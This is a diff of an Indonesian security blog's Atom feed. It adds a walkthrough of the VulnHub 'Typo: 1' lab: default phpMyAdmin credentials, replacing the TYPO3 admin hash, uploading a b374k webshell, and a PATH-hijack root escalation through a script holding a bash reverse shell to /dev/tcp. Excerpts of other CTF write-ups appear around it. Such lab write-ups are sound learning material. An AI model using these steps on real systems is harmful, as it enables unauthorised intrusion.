@@ -1,5 +1,159 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-05-05T14:44:31+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">bl33dz:~#</title><subtitle>bl33dz&lt;br&gt; ordinary people&lt;br&gt; interested in linux and programming
-</subtitle><author><name>bl33dz</name></author><entry><title type="html">[HTB] Bitlab</title><link href="http://localhost:4000/2020/05/05/hackthebox-bitlab.html" rel="alternate" type="text/html" title="[HTB] Bitlab" /><published>2020-05-05T00:00:00+07:00</published><updated>2020-05-05T00:00:00+07:00</updated><id>http://localhost:4000/2020/05/05/hackthebox-bitlab</id><content type="html" xml:base="http://localhost:4000/2020/05/05/hackthebox-bitlab.html">&lt;p&gt;Writeup machine Bitlab ini ditulis setelah writeup machine Craft. Nah karena kebetulan machine ini dah retired jadinya bisa publish post ini. Seperti biasa cerita dikit, menurutku machine ini lebih mirip ke CTF daripada real. Untuk lebih jelasnya simak post ini baik baik.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://bl33dz.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="http://bl33dz.github.io/" rel="alternate" type="text/html" /><updated>2020-05-20T16:04:36+07:00</updated><id>http://bl33dz.github.io/feed.xml</id><title type="html">bl33dz:~#</title><subtitle>bl33dz&lt;br&gt; ordinary people&lt;br&gt; interested in linux and programming
+</subtitle><author><name>bl33dz</name></author><entry><title type="html">[VULNHUB] Typo: 1</title><link href="http://bl33dz.github.io/2020/05/20/vulnhub-typo1.html" rel="alternate" type="text/html" title="[VULNHUB] Typo: 1" /><published>2020-05-20T00:00:00+07:00</published><updated>2020-05-20T00:00:00+07:00</updated><id>http://bl33dz.github.io/2020/05/20/vulnhub-typo1</id><content type="html" xml:base="http://bl33dz.github.io/2020/05/20/vulnhub-typo1.html">&lt;p&gt;Ketemu lagi di artikel baru saya, artikel ini ditulis karena kebetulan saya sedang tidak ada kerjaan lain dan sedang dibuat pusing oleh machine &lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/252&quot;&gt;Travel&lt;/a&gt; pada HackTheBox. Maka dari itu saya iseng iseng liat machine di vulnhub dan menemukan machine &lt;a href=&quot;https://www.vulnhub.com/entry/typo-1,472/&quot;&gt;Typo: 1&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Machine ini sendiri menggunakan operasi sistem Linux dan tugas saya menemukan cara mendapatkan root flag pada machine ini. Setelah saya download file .ova machine ini, saya langsung deploy pada VirtualBox dan saya run machine tersebut.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/typo1.png&quot; alt=&quot;typo1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Terlihat IP Machine ini adalah &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.56.109&lt;/code&gt; (tergantung virtualbox) maka saya menambahkan IP tersebut ke &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; dengan domain &lt;code class=&quot;highlighter-rouge&quot;&gt;typo.local&lt;/code&gt; seperti yang diperintahkan pada deskripsi machine. Setelah itu saya melakukan scanning dengan nmap dan mendapatkan output seperti berikut.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/vulnhub/typo# nmap -sV -sC -oN typo.nmap typo.local
+[REDACTED]
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 cd:dc:8f:24:51:73:54:bc:87:62:a2:e6:ed:f1:c1:b4 (RSA)
+|   256 a9:39:a9:bf:b2:f7:01:22:65:07:be:15:48:e8:ef:11 (ECDSA)
+|_  256 77:f5:a9:ff:a6:44:7c:9c:34:41:f1:ec:73:5e:57:bd (ED25519)
+80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
+|_http-generator: TYPO3 CMS
+|_http-server-header: Apache/2.4.38 (Debian)
+| http-title: Armour: Infosec
+|_Requested resource was http://typo.local/en/
+8000/tcp open  http    Apache httpd 2.4.38
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Did not follow redirect to http://typo.local
+8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+8081/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+[REDACTED]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Kita bisa melihat beberapa port yang terbuka, namun saya tertarik dengan port 80. Ketika saya buka &lt;a href=&quot;http://typo.local/&quot;&gt;http://typo.local/&lt;/a&gt; akan ter-redirect ke &lt;a href=&quot;http://typo.local/en/&quot;&gt;http://typo.local/en/&lt;/a&gt; dan hanya menampilkan &lt;code class=&quot;highlighter-rouge&quot;&gt;HELLO user&lt;/code&gt;. Karena web ini menggunakan &lt;a href=&quot;https://typo3.org/&quot;&gt;Typo3&lt;/a&gt; saya mencoba melihat path &lt;code class=&quot;highlighter-rouge&quot;&gt;/typo3&lt;/code&gt; dan menampilkan tampilan seperti berikut.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/typo2.png&quot; alt=&quot;typo2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Saya mencoba mencari mencari berbagai exploit namun ternyata tidak ada yang cocok, akhirnya saya coba melakukan bruteforce directory dan hanya menemukan &lt;code class=&quot;highlighter-rouge&quot;&gt;/fileadmin&lt;/code&gt; dan itu adalah directory milik typo3. Maka saya mencoba melakukan bruteforce pada port lain.&lt;/p&gt;
+
+&lt;p&gt;Port 8080:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/vulnhub/typo# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://typo.local:8080/FUZZ
+[REDACTED]
+index.html              [Status: 200, Size: 0, Words: 1, Lines: 1]
+phpinfo.php             [Status: 200, Size: 95848, Words: 4749, Lines: 1179]
+[REDACTED]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Port 8081:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/vulnhub/typo# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://typo.local:8081/FUZZ
+[REDACTED]
+index.html              [Status: 200, Size: 6, Words: 1, Lines: 2]
+phpmyadmin              [Status: 301, Size: 320, Words: 20, Lines: 10]
+[REDACTED]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Untuk port 8000 sendiri tidak saya lakukan bruteforce karena semua request akan diarahkan ke port 80. Dari result diatas saya tetap tidak menemukan sesuatu menarik kecuali &lt;code class=&quot;highlighter-rouge&quot;&gt;phpmyadmin&lt;/code&gt;. Awalnya saya stuck cukup lama dan akhirnya saya coba coba login di phpmyadmin dengan user “root” dan password “” namun ternyata tidak diperbolehkan login tanpa password. Kemudian saya mencoba lagi dengan &lt;del&gt;ilmu dukun&lt;/del&gt; user “root” dan password “root” ternyata dapat login pada phpmyadmin tersebut.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/typo3.png&quot; alt=&quot;typo3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Saya langsung inisiatif melihat tabel user dan mencoba merubah password admin, namun ternyata saya tidak tahu jenis hash yang digunakan. Setelah mencari cari ternyata web tersebut menggunakan hash &lt;code class=&quot;highlighter-rouge&quot;&gt;argon2id&lt;/code&gt;. Saya pun mencoba melakukan generate pada web &lt;a href=&quot;https://argon2.online/&quot;&gt;https://argon2.online/&lt;/a&gt; menggunakan option seperti berikut.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/typo4.png&quot; alt=&quot;typo4&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Setelah mendapatkan hasil hash dari password &lt;code class=&quot;highlighter-rouge&quot;&gt;bleedz123&lt;/code&gt; maka saya melakukan update pada tabel &lt;code class=&quot;highlighter-rouge&quot;&gt;be_users&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/typo5.png&quot; alt=&quot;typo5&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Saya mencoba login pada CMS Typo3 di port 80 dengan menggunakan user &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; dan password &lt;code class=&quot;highlighter-rouge&quot;&gt;bleedz123&lt;/code&gt;. Ternyata saya dapat login dan diarahkan ke dashboard admin. Disini saya langsung mencoba melakukan upload file namun gagal.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/typo6.png&quot; alt=&quot;typo6&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Setelah membaca baca dokumentasi ternyata ada cara untuk menghapus filter extension pada Typo3 dengan mengosongkan fileDenyPattern pada Global Typo3 Options. (&lt;a href=&quot;https://docs.typo3.org/m/typo3/guide-security/8.7/en-us/GuidelinesIntegrators/GlobalTypo3Options/Index.html&quot;&gt;Reference&lt;/a&gt;).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/typo7.png&quot; alt=&quot;typo7&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Maka saya tinggal melakukan upload dengan langkah sebelumnya dan file saya akan ter-upload pada &lt;code class=&quot;highlighter-rouge&quot;&gt;http://typo.local/fileadmin/bejak.php&lt;/code&gt;. Saya langsung mencoba lakukan backconnect dengan fitur yang sudah tersedia pada webshell b374k.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/typo8.png&quot; alt=&quot;typo8&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tentunya sebelum saya backconnect saya sudah menyiapkan listener dengan command seperti berikut.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/typo9.png&quot; alt=&quot;typo9&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lalu setelah akhirnya mendapatkan interactive shell dan melakukan magic netcat agar lebih stabil saya mencoba melakukan enumerasi menggunakan &lt;a href=&quot;https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh&quot;&gt;LinEnum.sh&lt;/a&gt;. Dan saya mencurigai 2 file suid yang terdapat pada server tersebut.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[-] SUID files:
+[REDACTED]
+-rwsr-sr-x 1 root root 6883 Mar 30 17:13 /usr/local/bin/apache2-restart
+-rwsr-sr-x 1 root root 2963219 Feb 13 13:00 /usr/local/bin/phpunit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Awalnya saya mencoba phpunit dengan membuat file &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/evil/revTest.php&lt;/code&gt; dan mencoba run &lt;code class=&quot;highlighter-rouge&quot;&gt;phpunit evil&lt;/code&gt; namun ternyata saya hanya mendapatkan user www-data bukan root.&lt;/p&gt;
+
+&lt;p&gt;Akhirnya saya mencoba mengidentifikasi file &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/bin/apache2-restart&lt;/code&gt; karena secara default file tersebut tidaklah ada.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@typo:/tmp$ file /usr/local/bin/apache2-restart 
+/usr/local/bin/apache2-restart: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=7f141086cfbe35713b5871941d2fdb74795d89ab, not stripped
+
+www-data@typo:/tmp$ strings /usr/local/bin/apache2-restart 
+/lib64/ld-linux-x86-64.so.2
+5q;Xq
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+service apache2 start
+[REDACTED]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ternyata binary tersebut hanya menjalankan command &lt;code class=&quot;highlighter-rouge&quot;&gt;service apache2 start&lt;/code&gt; dimana pada kasus seperti ini kita dapat melakukan privilege escalation dengan mengubah variable PATH. Pertama siapkan listener dan jalankan command seperti berikut ini.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@typo:/tmp$ vim service
+www-data@typo:/tmp$ chmod +x service 
+www-data@typo:/tmp$ cat service 
+#!/bin/bash
+/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.1/4444 0&amp;gt;&amp;amp;1
+www-data@typo:/tmp$ export PATH=/tmp
+www-data@typo:/tmp$ /usr/local/bin/apache2-restart
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Setelah itu listener kita akan mendapat interactive shell dan kita dapat melihat flag root.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/vulnhub/typo# nc -vlp 4444
+listening on [any] 4444 ...
+connect to [192.168.56.1] from typo.local [192.168.56.109] 52994
+root@typo:/tmp# export PATH=/bin:/usr/bin:/usr/local/bin 
+export PATH=/bin:/usr/bin:/usr/local/bin
+root@typo:/tmp# cd /root
+cd /root
+root@typo:/root# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+root@typo:/root# ls
+ls
+proof.txt
+root@typo:/root# cat proof.txt
+cat proof.txt
+Best of Luck
+$2y$12$EUztpmoFH8LjEzUBVyNKw.9AKf37uZWPxJp.A3aap2ff0LbLYZrF
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Menurut pendapat saya machine ini sendiri memerlukan banyak enumerating terutama pada tiap port dan kita perlu memiliki sedikit &lt;del&gt;ilmu dukun&lt;/del&gt; insting untuk menebak password PHPMyAdmin.&lt;/p&gt;
+
+&lt;p&gt;Sekian walkthrough yang bisa saya buat, jika ada yang kurang jelas bisa ditanyakan melalui telegram atau facebook saya and see you next article.&lt;/p&gt;</content><author><name>bl33dz</name></author><category term="vulnhub" /><category term="linux" /><category term="medium" /><summary type="html">Ketemu lagi di artikel baru saya, artikel ini ditulis karena kebetulan saya sedang tidak ada kerjaan lain dan sedang dibuat pusing oleh machine Travel pada HackTheBox. Maka dari itu saya iseng iseng liat machine di vulnhub dan menemukan machine Typo: 1.</summary></entry><entry><title type="html">[HTB] Bitlab</title><link href="http://bl33dz.github.io/2020/05/05/hackthebox-bitlab.html" rel="alternate" type="text/html" title="[HTB] Bitlab" /><published>2020-05-05T00:00:00+07:00</published><updated>2020-05-05T00:00:00+07:00</updated><id>http://bl33dz.github.io/2020/05/05/hackthebox-bitlab</id><content type="html" xml:base="http://bl33dz.github.io/2020/05/05/hackthebox-bitlab.html">&lt;p&gt;Writeup machine Bitlab ini ditulis setelah writeup machine Craft. Nah karena kebetulan machine ini dah retired jadinya bisa publish post ini. Seperti biasa cerita dikit, menurutku machine ini lebih mirip ke CTF daripada real. Untuk lebih jelasnya simak post ini baik baik.&lt;/p&gt;
 
 &lt;p&gt;Oke, machine ini menggunakan os linux dan ip addressnya adalah 10.10.10.114 dan hal yang pertama kita lakukan adalah ritual scanning dengan nmap untuk ngintip port port yang kebuka&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/htb/gitlab# nmap -sV 10.10.10.114
@@ -132,7 +286,7 @@ clave
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Nahkan langsung dapet dua flag &lt;em&gt;wkwkwk&lt;/em&gt;. Ngomong ngomong writeup ini agak ribet dan untuk yang kurang jelas bisa kontak telegram saya &lt;a href=&quot;https://t.me/bl33dz&quot;&gt;@bl33dz&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;Dan kalo bisa &lt;em&gt;Respect&lt;/em&gt; akun hackthebox saya yang ada dibawah ini.&lt;/p&gt;</content><author><name>bl33dz</name></author><category term="hackthebox" /><category term="linux" /><category term="medium" /><summary type="html">Writeup machine Bitlab ini ditulis setelah writeup machine Craft. Nah karena kebetulan machine ini dah retired jadinya bisa publish post ini. Seperti biasa cerita dikit, menurutku machine ini lebih mirip ke CTF daripada real. Untuk lebih jelasnya simak post ini baik baik.</summary></entry><entry><title type="html">[JOINTS2020] Writeup Category Web</title><link href="http://localhost:4000/2020/05/04/web-joints.html" rel="alternate" type="text/html" title="[JOINTS2020] Writeup Category Web" /><published>2020-05-04T00:00:00+07:00</published><updated>2020-05-04T00:00:00+07:00</updated><id>http://localhost:4000/2020/05/04/web-joints</id><content type="html" xml:base="http://localhost:4000/2020/05/04/web-joints.html">&lt;p&gt;Setelah beberapa &lt;del&gt;abad&lt;/del&gt; bulan ga nulis, tiba tiba ada rasa pengen nulis blog ini lagi (efek kurang kerjaan kali). Nah, kebetulan kemaren saya mengikuti kompetisi CTF pada acara JOINTS 2020 yang diselenggarakan oleh Himpunan Mahasiswa Ilmu Komputer Universitas Gadjah Mada.&lt;/p&gt;
+&lt;p&gt;Dan kalo bisa &lt;em&gt;Respect&lt;/em&gt; akun hackthebox saya yang ada dibawah ini.&lt;/p&gt;</content><author><name>bl33dz</name></author><category term="hackthebox" /><category term="linux" /><category term="medium" /><summary type="html">Writeup machine Bitlab ini ditulis setelah writeup machine Craft. Nah karena kebetulan machine ini dah retired jadinya bisa publish post ini. Seperti biasa cerita dikit, menurutku machine ini lebih mirip ke CTF daripada real. Untuk lebih jelasnya simak post ini baik baik.</summary></entry><entry><title type="html">[JOINTS2020] Writeup Category Web</title><link href="http://bl33dz.github.io/2020/05/04/web-joints.html" rel="alternate" type="text/html" title="[JOINTS2020] Writeup Category Web" /><published>2020-05-04T00:00:00+07:00</published><updated>2020-05-04T00:00:00+07:00</updated><id>http://bl33dz.github.io/2020/05/04/web-joints</id><content type="html" xml:base="http://bl33dz.github.io/2020/05/04/web-joints.html">&lt;p&gt;Setelah beberapa &lt;del&gt;abad&lt;/del&gt; bulan ga nulis, tiba tiba ada rasa pengen nulis blog ini lagi (efek kurang kerjaan kali). Nah, kebetulan kemaren saya mengikuti kompetisi CTF pada acara JOINTS 2020 yang diselenggarakan oleh Himpunan Mahasiswa Ilmu Komputer Universitas Gadjah Mada.&lt;/p&gt;
 
 &lt;p&gt;Karena ternyata bisa nyelesain semua soal category web (&lt;del&gt;sombong dikit&lt;/del&gt;), akhirnya jadilah artikel ke tiga pada blog ini. Berikut adalah daftar challenge category web pada CTF JOINTS 2020.&lt;/p&gt;
 
@@ -327,7 +481,7 @@ Here you go admin : JOINTS20{L333T_k1dz_Pl4y_with_CrLF_and_CORS_31337}
 
 &lt;p&gt;Sekian writeup yang bisa saya tulis, mohon maaf kalau tulisannya jelek soalnya tadi dikejar deadline pengumpulan writeup (mager juga suruh baca ulang). Dan jikalau saya ada salah kata mohon maaf.&lt;/p&gt;
 
-&lt;p&gt;Sampai ketemu di next artikel.&lt;/p&gt;</content><author><name>bl33dz</name></author><category term="ctf" /><category term="web" /><category term="xss" /><category term="rce" /><summary type="html">Setelah beberapa abad bulan ga nulis, tiba tiba ada rasa pengen nulis blog ini lagi (efek kurang kerjaan kali). Nah, kebetulan kemaren saya mengikuti kompetisi CTF pada acara JOINTS 2020 yang diselenggarakan oleh Himpunan Mahasiswa Ilmu Komputer Universitas Gadjah Mada.</summary></entry><entry><title type="html">[HTB] Wall</title><link href="http://localhost:4000/2019/12/07/hackthebox-wall.html" rel="alternate" type="text/html" title="[HTB] Wall" /><published>2019-12-07T00:00:00+07:00</published><updated>2019-12-07T00:00:00+07:00</updated><id>http://localhost:4000/2019/12/07/hackthebox-wall</id><content type="html" xml:base="http://localhost:4000/2019/12/07/hackthebox-wall.html">&lt;p&gt;Ya, akhirnya machine Wall ini retired dan digantikan machine baru &lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/220&quot;&gt;Resolute&lt;/a&gt; (Windows) dan  sebenernya saya lebih ngarep diganti machine linux tapi apa boleh buat. Oke balik ke machine ini Wall adalah machine yg menggunakan os linux yang memiliki IP &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.157&lt;/code&gt;. Menurut saya sendiri machine wall ini agak agak kaya ctf ya tapi lumayan lah.&lt;/p&gt;
+&lt;p&gt;Sampai ketemu di next artikel.&lt;/p&gt;</content><author><name>bl33dz</name></author><category term="ctf" /><category term="web" /><category term="xss" /><category term="rce" /><summary type="html">Setelah beberapa abad bulan ga nulis, tiba tiba ada rasa pengen nulis blog ini lagi (efek kurang kerjaan kali). Nah, kebetulan kemaren saya mengikuti kompetisi CTF pada acara JOINTS 2020 yang diselenggarakan oleh Himpunan Mahasiswa Ilmu Komputer Universitas Gadjah Mada.</summary></entry><entry><title type="html">[HTB] Wall</title><link href="http://bl33dz.github.io/2019/12/07/hackthebox-wall.html" rel="alternate" type="text/html" title="[HTB] Wall" /><published>2019-12-07T00:00:00+07:00</published><updated>2019-12-07T00:00:00+07:00</updated><id>http://bl33dz.github.io/2019/12/07/hackthebox-wall</id><content type="html" xml:base="http://bl33dz.github.io/2019/12/07/hackthebox-wall.html">&lt;p&gt;Ya, akhirnya machine Wall ini retired dan digantikan machine baru &lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/220&quot;&gt;Resolute&lt;/a&gt; (Windows) dan  sebenernya saya lebih ngarep diganti machine linux tapi apa boleh buat. Oke balik ke machine ini Wall adalah machine yg menggunakan os linux yang memiliki IP &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.157&lt;/code&gt;. Menurut saya sendiri machine wall ini agak agak kaya ctf ya tapi lumayan lah.&lt;/p&gt;
 
 &lt;p&gt;Pertama, kaya biasa scan scan dulu pake nmap siapa tau nemu jalan &lt;del&gt;ke hatinya&lt;/del&gt; buat dapetin flag.&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:~\htb\wall&amp;gt; nmap -sV -sC -sT  10.10.10.157 
@@ -424,7 +578,7 @@ fe6194544f452f62dc905b12f8da8406
 
 &lt;p&gt;Dan akhirnya, sekali dayung 2 flag termiliki. Untuk lebih jelas mengenai &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/libhax.so&lt;/code&gt; dan &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/rootshell&lt;/code&gt; bisa dilihat di link exploit db diatas tadi.&lt;/p&gt;
 
-&lt;p&gt;Oke selesai juga machine ini, dan semoga ga males untuk nulis writeup selanjutnya.&lt;/p&gt;</content><author><name>bl33dz</name></author><category term="hackthebox" /><category term="linux" /><category term="medium" /><summary type="html">Ya, akhirnya machine Wall ini retired dan digantikan machine baru Resolute (Windows) dan sebenernya saya lebih ngarep diganti machine linux tapi apa boleh buat. Oke balik ke machine ini Wall adalah machine yg menggunakan os linux yang memiliki IP 10.10.10.157. Menurut saya sendiri machine wall ini agak agak kaya ctf ya tapi lumayan lah.</summary></entry><entry><title type="html">[VULNHUB] hackNos: Os-hackNos</title><link href="http://localhost:4000/2019/12/02/vulnhub-hacknos.html" rel="alternate" type="text/html" title="[VULNHUB] hackNos: Os-hackNos" /><published>2019-12-02T00:00:00+07:00</published><updated>2019-12-02T00:00:00+07:00</updated><id>http://localhost:4000/2019/12/02/vulnhub-hacknos</id><content type="html" xml:base="http://localhost:4000/2019/12/02/vulnhub-hacknos.html">&lt;p&gt;My first vulnhub writeup, ya ini adalah writeup vulnhub pertama saya dan juga post pertama di blog ini. Sebenarnya saya sudah menulis beberapa writeup machine hackthebox namun karena machine tersebut belum retired jadi belum saya publish.&lt;/p&gt;
+&lt;p&gt;Oke selesai juga machine ini, dan semoga ga males untuk nulis writeup selanjutnya.&lt;/p&gt;</content><author><name>bl33dz</name></author><category term="hackthebox" /><category term="linux" /><category term="medium" /><summary type="html">Ya, akhirnya machine Wall ini retired dan digantikan machine baru Resolute (Windows) dan sebenernya saya lebih ngarep diganti machine linux tapi apa boleh buat. Oke balik ke machine ini Wall adalah machine yg menggunakan os linux yang memiliki IP 10.10.10.157. Menurut saya sendiri machine wall ini agak agak kaya ctf ya tapi lumayan lah.</summary></entry><entry><title type="html">[VULNHUB] hackNos: Os-hackNos</title><link href="http://bl33dz.github.io/2019/12/02/vulnhub-hacknos.html" rel="alternate" type="text/html" title="[VULNHUB] hackNos: Os-hackNos" /><published>2019-12-02T00:00:00+07:00</published><updated>2019-12-02T00:00:00+07:00</updated><id>http://bl33dz.github.io/2019/12/02/vulnhub-hacknos</id><content type="html" xml:base="http://bl33dz.github.io/2019/12/02/vulnhub-hacknos.html">&lt;p&gt;My first vulnhub writeup, ya ini adalah writeup vulnhub pertama saya dan juga post pertama di blog ini. Sebenarnya saya sudah menulis beberapa writeup machine hackthebox namun karena machine tersebut belum retired jadi belum saya publish.&lt;/p&gt;
 
 &lt;p&gt;Oke, hackNos ini adalah machine yg menggunakan os linux. Untuk info machine ini sendiri bisa diklik link berikut &lt;a href=&quot;https://www.vulnhub.com/entry/hacknos-os-hacknos,401/&quot;&gt;hackNos&lt;/a&gt; lalu download file OVA yg tersedia.&lt;/p&gt;
 
